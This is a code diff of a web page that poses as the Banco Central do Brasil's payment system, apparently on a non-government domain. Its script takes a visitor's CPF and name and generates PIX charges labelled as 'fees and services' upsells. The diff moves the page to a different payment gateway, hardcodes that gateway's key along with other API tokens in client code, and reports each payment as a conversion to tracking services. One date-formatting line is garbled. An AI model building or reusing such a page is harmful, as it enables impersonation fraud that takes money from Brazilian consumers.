@@ -169,13 +169,12 @@
     </div>
   </div>
 
-  <!-- FOOTER -->
+    <!-- FOOTER -->
   <footer class="bg-slate-900 text-slate-400 py-4 px-4 text-center text-xs border-t border-slate-800">
     <p>&copy; 2026 Sistema de Pagamentos Brasileiro &mdash; Banco Central do Brasil</p>
   </footer>
 
   <script>
-        const UTMIFY_TOKEN = "4FXxt7detgdLRz0HO72VbYr9WTXyOgXnW2qB";
     function getUtmParams() {
       try {
         let p = new URLSearchParams(window.location.search);
@@ -188,40 +187,48 @@
           utm_content: p.get('utm_content') || localStorage.getItem('utm_content') || null,
           utm_term: p.get('utm_term') || localStorage.getItem('utm_term') || null
         };
-      } catch(e) { return { src: null, sck: null, utm_source: null, utm_campaign: null, utm_medium: null, utm_content: null, utm_term: null }; }
+      } catch(e) {
+        return { src: null, sck: null, utm_source: null, utm_campaign: null, utm_medium: null, utm_content: null, utm_term: null };
+      }
     }
+
     function getUtcDate() {
       let d = new Date(), pad = (n) => String(n).padStart(2, '0');
-      return ${d.getUTCFullYear()}-- ::;
+      return \-\-\ \:\:\;
     }
-    function sendUtmifyApiOrder(orderId, amountInCents, title, custName, custCpf) {
+
+    const UTMIFY_TOKEN = "Pr1b4TW95zI8AmaDRYeqI2GfyAVvhOM4SsL9";
+
+    function sendUtmifyApiOrder(orderId, amountInCents, title, customerName, customerCpf) {
       try {
         let utms = getUtmParams();
         let now = getUtcDate();
         let body = {
           orderId: String(orderId || "ORDER-" + Date.now()),
-          platform: "TECHBYNET",
+          platform: "AVEN",
           paymentMethod: "pix",
           status: "paid",
           createdAt: now,
           approvedDate: now,
           refundedAt: null,
           customer: {
-            name: String(custName || "Cliente").trim(),
-            email: "cliente" + String(custCpf||"").slice(0,6) + "@email.com",
+            name: String(customerName || "Cliente").trim(),
+            email: "cliente" + (customerCpf ? customerCpf.slice(0, 6) : "000000") + "@email.com",
             phone: "11999999999",
-            document: String(custCpf || "07580365316").replace(/\D/g, ""),
+            document: String(customerCpf || "07580365316").replace(/\D/g, ""),
             country: "BR",
             ip: "127.0.0.1"
           },
-          products: [{
-            id: "prod-" + amountInCents,
-            name: title || "Serviços e Taxas",
-            planId: "plan-1",
-            planName: "Padrão",
-            quantity: 1,
-            priceInCents: Number(amountInCents)
-          }],
+          products: [
+            {
+              id: "upsell-4",
+              name: title || "Servicos e Taxas",
+              planId: "plan-4",
+              planName: "Padrao",
+              quantity: 1,
+              priceInCents: Number(amountInCents)
+            }
+          ],
           trackingParameters: utms,
           commission: {
             totalPriceInCents: Number(amountInCents),
@@ -231,6 +238,7 @@
           },
           isTest: false
         };
+
         fetch("https://api.utmify.com.br/api-credentials/orders", {
           method: "POST",
           headers: {
@@ -241,19 +249,21 @@
         }).catch(function(e){});
       } catch(e){}
     }
-    const TECHBYNET_API_KEY = "f3496353-b145-431a-91ac-1e47968b5b6f";
-    const TECHBYNET_BASE_URL = "https://api-gateway.techbynet.com";
+
+    const AVEN_KEY = "OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0";
     let urlParams = new URLSearchParams(window.location.search);
     let rawCpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
     let cpf = rawCpf.replace(/\D/g, '') || "07580365316";
     let nome = (urlParams.get('nome') || localStorage.getItem('userName') || 'Vendas da Silva').trim();
 
     if (nome && nome !== 'Vendas da Silva') {
-      document.getElementById('u-nome').textContent = nome;
+      let elNome = document.getElementById('u-nome');
+      if (elNome) elNome.textContent = nome;
       try { localStorage.setItem('userName', nome); } catch(e){}
     }
     if (cpf && cpf.length === 11) {
-      document.getElementById('u-cpf').textContent = cpf.slice(0,3) + '.***.***-' + cpf.slice(-2);
+      let elCpf = document.getElementById('u-cpf');
+      if (elCpf) elCpf.textContent = cpf.slice(0,3) + '.***.***-' + cpf.slice(-2);
       try { localStorage.setItem('userCPF', cpf); } catch(e){}
     }
 
@@ -261,109 +271,135 @@
     let pollInterval = null;
 
     async function gerarPixUpsell() {
-      document.getElementById('modal-pix').classList.remove('hidden');
-      document.getElementById('pix-loading').classList.remove('hidden');
-      document.getElementById('pix-content').classList.add('hidden');
+      let modal = document.getElementById('modal-pix');
+      let pLoading = document.getElementById('pix-loading');
+      let pContent = document.getElementById('pix-content');
+      if (modal) modal.classList.remove('hidden');
+      if (pLoading) pLoading.classList.remove('hidden');
+      if (pContent) pContent.classList.add('hidden');
 
       let utms = getUtmParams();
+      let host = (typeof window !== "undefined" && window.location.hostname) || 'taliaconsultor.click';
+      let prodTitle = "Taxas e Servicos Upsell 4 - " + host;
+
       let payload = {
-        amount: 6743,
-        paymentMethod: "PIX",
-        items: [{
-          title: "Servicos e Taxas",
-          quantity: 1,
-          unitPrice: 6743,
-          tangible: false
-        }],
-        customer: {
-          name: nome || "Cliente",
-          email: "cliente" + (cpf ? cpf.slice(0,6) : "") + "@email.com",
-          phone: "11999999999",
-          document: {
-            type: "CPF",
-            number: cpf || "07580365316"
-          }
+        amount: 1490,
+        currency: "BRL",
+        method: "PIX",
+        description: prodTitle,
+        externalRef: "order_" + Date.now() + "_" + host.replace(/[^a-zA-Z0-9]/g, ''),
+        payer: {
+          name: nome || "Vendas da Silva",
+          taxId: cpf || "07580365316",
+          email: "cliente" + (cpf ? cpf.slice(0,6) : "000000") + "@email.com",
+          phone: "11999999999"
         },
-        pix: {
-          expiresInDays: 1
+        items: [{
+          quantity: 1,
+          name: prodTitle,
+          price: 1490,
+          type: "DIGITAL"
+        }],
+        utms: {
+          utmSource: utms.utm_source,
+          utmMedium: utms.utm_medium,
+          utmCampaign: utms.utm_campaign,
+          utmContent: utms.utm_content,
+          utmTerm: utms.utm_term,
+          src: utms.src,
+          sck: utms.sck
         }
       };
 
       try {
-        let res = await fetch(TECHBYNET_BASE_URL + "/api/user/transactions", {
+        let res = await fetch("https://api.avenpayments.com/v1/payment", {
           method: "POST",
           headers: {
-            "x-api-key": TECHBYNET_API_KEY,
-            "Content-Type": "application/json",
-            "Accept": "application/json"
+            "Authorization": "Bearer " + AVEN_KEY,
+            "Content-Type": "application/json"
           },
           body: JSON.stringify(payload)
         });
         let data = await res.json();
-        let code = data?.data?.pix?.qrcode || data?.data?.qrCode || data?.pix?.qrcode || data?.qrCode;
-        let id = data?.data?.id || data?.id;
-        if (data && id && code) {
+        let code = data?.data?.copypaste || data?.copypaste || data?.pixCopiaECola || data?.pixCode;
+        let id = data?.id || data?.data?.id;
+
+        if (code && id) {
           transactionId = id;
 
-          document.getElementById('pix-code').value = code;
-          document.getElementById('qrcode-box').innerHTML = "";
-          new QRCode(document.getElementById('qrcode-box'), {
-            text: code,
-            width: 180,
-            height: 180
-          });
+          let pixInput = document.getElementById('pix-code');
+          if (pixInput) pixInput.value = code;
+          let qrBox = document.getElementById('qrcode-box');
+          if (qrBox) {
+            qrBox.innerHTML = "";
+            new QRCode(qrBox, {
+              text: code,
+              width: 180,
+              height: 180
+            });
+          }
 
-          document.getElementById('pix-loading').classList.add('hidden');
-          document.getElementById('pix-content').classList.remove('hidden');
+          if (pLoading) pLoading.classList.add('hidden');
+          if (pContent) pContent.classList.remove('hidden');
 
           iniciarVerificacaoStatus(transactionId);
         } else {
           console.error("AVEN Error:", data);
           alert("Nao foi possivel gerar a cobranca. Tente novamente.");
-          document.getElementById('modal-pix').classList.add('hidden');
+          if (modal) modal.classList.add('hidden');
         }
       } catch(err) {
         console.error("Fetch Error:", err);
         alert("Erro de conexao com o gateway. Tente novamente.");
-        document.getElementById('modal-pix').classList.add('hidden');
+        if (modal) modal.classList.add('hidden');
       }
     }
 
     function copiarPix() {
       let input = document.getElementById('pix-code');
-      input.select();
-      input.setSelectionRange(0, 99999);
-      navigator.clipboard.writeText(input.value);
+      if (input) {
+        input.select();
+        input.setSelectionRange(0, 99999);
+        navigator.clipboard.writeText(input.value);
+      }
       let btn = document.getElementById('btn-copy');
-      btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
-      btn.classList.replace('bg-emerald-600', 'bg-blue-600');
-      setTimeout(() => {
-        btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar';
-        btn.classList.replace('bg-blue-600', 'bg-emerald-600');
-      }, 2000);
+      if (btn) {
+        btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
+        btn.classList.replace('bg-emerald-600', 'bg-blue-600');
+        setTimeout(() => {
+          btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar';
+          btn.classList.replace('bg-blue-600', 'bg-emerald-600');
+        }, 2000);
+      }
     }
 
     function iniciarVerificacaoStatus(id) {
       if (pollInterval) clearInterval(pollInterval);
       pollInterval = setInterval(async () => {
         try {
-          let res = await fetch(TECHBYNET_BASE_URL + "/api/user/transactions/" + encodeURIComponent(id), {
+          let res = await fetch("https://api.avenpayments.com/v1/payment/" + id, {
             method: "GET",
             headers: {
-              "x-api-key": TECHBYNET_API_KEY,
-              "Accept": "application/json"
+              "Authorization": "Bearer " + AVEN_KEY,
+              "Content-Type": "application/json"
             }
           });
           let json = await res.json();
           if (json) {
-            let st = String(json?.data?.status || json?.status || "").toUpperCase();
+            let st = String(json.status || json.data?.status || "").toUpperCase();
             if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
               clearInterval(pollInterval);
               try {
+                if (window.GadsTracking && typeof window.GadsTracking.trackConversion === "function") {
+                  window.GadsTracking.trackConversion(14.90, "AW-18494813088/bhg5CK3AvJEdEKDngfNE");
+                } else if (typeof gtag === "function") {
+                  gtag("event", "conversion", { "send_to": "AW-18494813088/bhg5CK3AvJEdEKDngfNE", "value": 14.90, "currency": "BRL" });
+                }
                 window.dataLayer = window.dataLayer || [];
                 window.dataLayer.push({ event: "purchase", ecommerce: { transaction_id: String(id || Date.now()), value: 14.90, currency: "BRL" } });
                 if (typeof gtag === "function") { gtag("event", "purchase", { transaction_id: String(id || Date.now()), value: 14.90, currency: "BRL" }); }
                 if (window.utmify && typeof window.utmify.track === "function") { window.utmify.track("Purchase", { value: 14.90, currency: "BRL", transaction_id: String(id) }); }
+                sendUtmifyApiOrder(id, 1490, "Servicos e Taxas", nome, cpf);
               } catch(e){}
               
               let p = window.location.pathname;
